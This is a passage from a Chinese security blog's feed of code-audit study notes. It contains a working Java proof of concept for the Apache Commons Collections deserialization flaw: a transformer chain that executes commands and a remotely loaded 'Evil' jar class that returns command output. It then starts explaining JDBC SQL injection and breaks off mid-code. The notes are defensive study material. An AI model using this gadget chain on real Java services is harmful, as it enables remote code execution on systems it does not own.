<span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">&#123;</span>                <span class="token comment">//通过内置的ConstantTransformer来获取Runtime类</span>                <span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span><span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token comment">//通过InvokerTransformer来反射调用getMethod方法，参数是getRuntime，其后类似</span>                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"getMethod"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">&#123;</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">&#123;</span><span class="token string">"getRuntime"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"invoke"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">&#123;</span><span class="token class-name">Object</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">&#123;</span><span class="token keyword">null</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">&#123;</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">&#123;</span><span class="token string">"open -a Calculator"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>        <span class="token class-name">Transformer</span> transformChain <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ChainedTransformer</span><span class="token punctuation">(</span>transformers<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//普通的Map</span>        <span class="token class-name">Map</span> mp<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        mp<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"sw"</span><span class="token punctuation">,</span> <span class="token string">"demo"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 将普通的Map变成TransformedMap，并且指定变换方式为前面定义的恶意chain</span>        <span class="token class-name">Map</span> transformMap <span class="token operator">=</span> <span class="token class-name">TransformedMap</span><span class="token punctuation">.</span><span class="token function">decorate</span><span class="token punctuation">(</span>mp<span class="token punctuation">,</span> transformChain<span class="token punctuation">,</span> transformChain<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 修改TransformedMap中的一个值，成功执行命令</span>        <span class="token class-name">Map<span class="token punctuation">.</span>Entry</span> entry<span class="token operator">=</span><span class="token punctuation">(</span><span class="token class-name">Map<span class="token punctuation">.</span>Entry</span><span class="token punctuation">)</span> transformMap<span class="token punctuation">.</span><span class="token function">entrySet</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">iterator</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        entry<span class="token punctuation">.</span><span class="token function">setValue</span><span class="token punctuation">(</span><span class="token string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>注意第 25 行我执行的命令是 open -a Calculator，这里是 Mac 下打开计算机的命令，如果在 Windows 下则需要修改成对应命令。</p><p>运行一下代码，可以看到成功弹出计算器</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202111211543622.png"></p><p>这里只是实现了无回显的利用方式，接下来就利用代码注入实现有回显的利用。</p><h3 id="有回显利用"><a href="#有回显利用" class="headerlink" title="有回显利用"></a>有回显利用</h3><p>这里有回显利用的方式是使用 java.net.URLClassLoader 远程加载自定义恶意类，也就是自己放在服务器上的 jar 包，然后在抛出的异常信息中获得回显结果。</p><p>因此这里首先需要先写一个恶意类，具体如下：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">BufferedReader</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">InputStreamReader</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Evil</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token class-name">Exec</span><span class="token punctuation">(</span><span class="token class-name">String</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">Process</span> proc <span class="token operator">=</span> <span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span>args<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">BufferedReader</span> br <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BufferedReader</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">InputStreamReader</span><span class="token punctuation">(</span>proc<span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">StringBuffer</span> sb <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">StringBuffer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">String</span> line<span class="token punctuation">;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>line <span class="token operator">=</span> br<span class="token punctuation">.</span><span class="token function">readLine</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            sb<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>line<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token class-name">String</span> result <span class="token operator">=</span> sb<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Exception</span> e <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Exception</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">throw</span> e<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>将恶意类打包成 jar 文件，并放到服务器上，这里因为是本地演示，就直接在本地开个 Python HTTP 服务了。</p><pre class="line-numbers language-none"><code class="language-none">javac Evil.javajar -cvf Evil.jar Evil.classpython3 -m http.server 80<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p> 然后回到 intelliJ IDEA，在 com.commons 软件包中新建 ApacheCommonsCollectionsDemo2.java 文件，在文件中写入以下内容</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>commons</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span></span><span class="token class-name">Transformer</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">ChainedTransformer</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">ConstantTransformer</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">InvokerTransformer</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>keyvalue<span class="token punctuation">.</span></span><span class="token class-name">TiedMapEntry</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>map<span class="token punctuation">.</span></span><span class="token class-name">LazyMap</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">javax<span class="token punctuation">.</span>management<span class="token punctuation">.</span></span><span class="token class-name">BadAttributeValueExpException</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token operator">*</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Field</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>net<span class="token punctuation">.</span></span><span class="token class-name">MalformedURLException</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">HashMap</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Map</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ApacheCommonsCollectionsDemo2</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span> transformers <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>            transformers <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span>                    <span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>net<span class="token punctuation">.</span></span>URLClassLoader</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                    <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"getConstructor"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span>java<span class="token punctuation">.</span>net<span class="token punctuation">.</span>URL<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                    <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"newInstance"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token keyword">new</span> java<span class="token punctuation">.</span>net<span class="token punctuation">.</span>URL<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token keyword">new</span> java<span class="token punctuation">.</span>net<span class="token punctuation">.</span><span class="token function">URL</span><span class="token punctuation">(</span><span class="token string">"http://127.0.0.1/Evil.jar"</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                    <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"loadClass"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token string">"Evil"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                    <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"getMethod"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token string">"Exec"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                    <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"invoke"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">Object</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token string">"uname"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>            <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">MalformedURLException</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token class-name">Transformer</span> transformerChain <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ChainedTransformer</span><span class="token punctuation">(</span>transformers<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Map</span> innerMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Map</span> lazyMap <span class="token operator">=</span> <span class="token class-name">LazyMap</span><span class="token punctuation">.</span><span class="token function">decorate</span><span class="token punctuation">(</span>innerMap<span class="token punctuation">,</span> transformerChain<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">TiedMapEntry</span> entry <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TiedMapEntry</span><span class="token punctuation">(</span>lazyMap<span class="token punctuation">,</span> <span class="token string">"foo"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">BadAttributeValueExpException</span> poc <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BadAttributeValueExpException</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Field</span> valfield <span class="token operator">=</span> poc<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"val"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        valfield<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        valfield<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>poc<span class="token punctuation">,</span> entry<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">File</span> f <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span><span class="token string">"payload.ser"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">ObjectOutputStream</span> out <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileOutputStream</span><span class="token punctuation">(</span>f<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        out<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>poc<span class="token punctuation">)</span><span class="token punctuation">;</span>        out<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">FileInputStream</span> fis <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span><span class="token string">"payload.ser"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">ObjectInputStream</span> ois <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span>fis<span class="token punctuation">)</span><span class="token punctuation">;</span>        ois<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        ois<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里执行的命令是 uname，运行代码可以看到报错信息里显示了 Darwin，说明命令被成功执行了。</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202111211611336.png"></p><p>这样就利用代码注入实现了 Apache Commons collections 反序列化漏洞有回显的利用。</p><blockquote><p>参考链接：</p><p><a href="https://www.freebuf.com/vuls/251664.html">https://www.freebuf.com/vuls/251664.html</a></p><p><a href="https://www.anquanke.com/post/id/224487">https://www.anquanke.com/post/id/224487</a></p><p><a href="https://blog.csdn.net/Candyys/article/details/106006282">https://blog.csdn.net/Candyys/article/details/106006282</a></p><p><a href="https://blog.csdn.net/java276582434/article/details/90550578">https://blog.csdn.net/java276582434/article/details/90550578</a></p><p>更多信息欢迎关注我的个人微信公众号：TeamsSix</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/TeamsSix_Subscription_Logo2.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;0x01-命令注入&quot;&gt;&lt;a href=&quot;#0x01-命令注入&quot; class=&quot;headerlink&quot; title=&quot;0x01 命令注入&quot;&gt;&lt;/a&gt;0x01 命令注入&lt;/h1&gt;&lt;p&gt;在开发过程中，开发人员可能需要对系统文件进行移动、删除或者执行一些系统命令，这时如果</summary>
      
    
    
    
    <category term="代码审计" scheme="https://www.teamssix.com/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
    <category term="学习笔记" scheme="https://www.teamssix.com/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    <category term="代码审计" scheme="https://www.teamssix.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>【代码审计】SQL 注入</title>
    <link href="https://www.teamssix.com/211117-091653.html"/>
    <id>https://www.teamssix.com/211117-091653.html</id>
    <published>2021-11-17T01:16:53.000Z</published>
    <updated>2021-11-22T08:59:49.391Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x01-JDBC-拼接不当造成-SQL-注入"><a href="#0x01-JDBC-拼接不当造成-SQL-注入" class="headerlink" title="0x01 JDBC 拼接不当造成 SQL 注入"></a>0x01 JDBC 拼接不当造成 SQL 注入</h1><p>JDBC 有两种方法执行 SQL 语句，分别为 PrepareStatement 和 Statement，两个方法的区别在于 PrepareStatement 会对 SQL 语句进行预编译，而 Statement 在每次执行时都需要编译，会增大系统开销。</p><p>理论上 PrepareStatement 的效率和安全性会比 Statement 好，但不意味着就不会存在问题。</p><p>以下是一个使用 Statement 执行 SQL 语句的示例</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">String</span> sql <span class="token operator">=</span> <span class="token string">"select * from user where id ="</span><span class="token operator">+</span>req<span class="token punctuation">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span><span class="token string">"id"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">PrintWriter</span> out <span class="token operator">=</span> resp<span class="token punctuation">.</span><span class="token function">getWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Statement Demo"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"SQL: "</span><span class="token operator">+</span>sql<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">try</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">Statement</span> st <span class="token operator">=</span> conn<span class="token punctuation">.</span><span class="token function">createStatement</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">ResultSet</span> rs <span class="token operator">=</span> st<span class="token punctuation">.</span><span class="token function">executeQuery</span><span class="token punctuation">(</span>sql<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里如果输入的 id 为 1 or 1 = 2，那么 SQL 语句就会被拼接为 select * from user where id = 1 or 1 = 2，改变了想要查询 id = 1 的语义。 </p><p>PreqareStatement 方法支持使用 ? 对变量位进行占位，在预编译阶段填入相应的值会构造出完整的 SQL 语句，从而避免 SQL 注入的产生。</p><p>但开发有时为了便利，会直接采取拼接的方式构造 SQL 语句，这样一来依然会存在 SQL 注入，如下代码所示。</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">String</span> sql <span class="token operator">=</span> <span class="token string">"select * from user where id ="</span><span class="token operator">+</span>req<span class="token punctuation">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span><span class="token string">"id"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">PrintWriter</span> out <span class="token operator">=</span> resp<span class="token punctuation">.</span><span class="token function">getWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"prepareStatement Demo"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"SQL: "</span><span class="token operator">+</span>sql<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">try</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">PreparedStatement</span> pst <span class="token operator">=</span> conn<span class="token punctuation">.</span><span class="token function">prepareStatement</span><span class="token punctuation">(</span>sql<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">ResultSet</span> rs <span class="token operator">=</span> pst<span class="token punctuation">.</span><span class="token function">executeQuery</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>此时如果使用 or 1 = 1 仍然可以判断存在 SQL 注入，但是如果使用 ? 作为占位符，填入的字段的值就会进行严格的类型检查，就可以有效的避免 SQL 注入的产生，如下代码所示。</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">PrintWriter</span> out <span class="token operator">=</span> resp<span class="token punctuation">.</span><span class="token function">getWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"prepareStatement Demo"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">String</span> sql <span class="token operator">=</span> <span class="token string">"select * from user 